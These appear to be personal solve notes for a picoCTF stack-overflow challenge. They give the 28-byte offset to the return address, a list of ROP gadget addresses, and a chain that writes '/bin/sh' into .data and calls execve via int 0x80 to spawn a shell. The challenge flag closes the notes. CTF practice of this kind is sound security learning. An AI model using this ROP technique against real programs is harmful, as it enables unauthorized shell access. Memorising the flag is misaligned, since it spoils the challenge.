the return address - 0xffffcefc
the buf array address - 0xffffcee0
offset - 0xffffcefc-0xffffcee0 = 0x1c(28)

to call execve("/bin/sh") in assembly 
    eax = 11  
    ebx = addres of the string "/bin/sh\x00"
    ecx = NULL
    edx = NULL
    syscall

where to store the string "/bin/sh"
    we can store it in .data sectionor .bss section
    we cannot store the string in the stack(?)

gadgets to exploit
    to write to eax 
        0x80b073a pop eax ; ret
    make eax NULL
        0x804fb80 xor eax, eax ; ret
    to write to ebx
        0x8049022 pop ebx ; ret    
    to write to ecx 
        0x8049e29 pop ecx ; ret
    write eax value to the address stored in edx 
        0x80590f2 mov dword ptr [edx], eax ; ret
    to write to edx (with ebx)
        0x80583b9 pop edx ; pop ebx ; ret
    syscall 
        0x804a3c2 int 0x80
    .data address   
        0x080e5060

final structure
    pop edx with ebx
    push .data
    push .data
    pop eax
    push 0x6e69622f    
        "/bin" in little endian
    write to [edx]
    pop edx with ebx
    push .data+0x4
    push .data+0x4
    pop eax
    push 0x68732f 
        "/sh\0" in little endian
    write to [edx]
    pop ecx
    push .data+0x8
    pop edx with ebx
    push .data+0x8
    push .data
    make eax NULL
    write to [edx]
    pop eax
    push 0xb
    syscall

flag - picoCTF{5n47ch_7h3_5h311_6b81dc42}

    

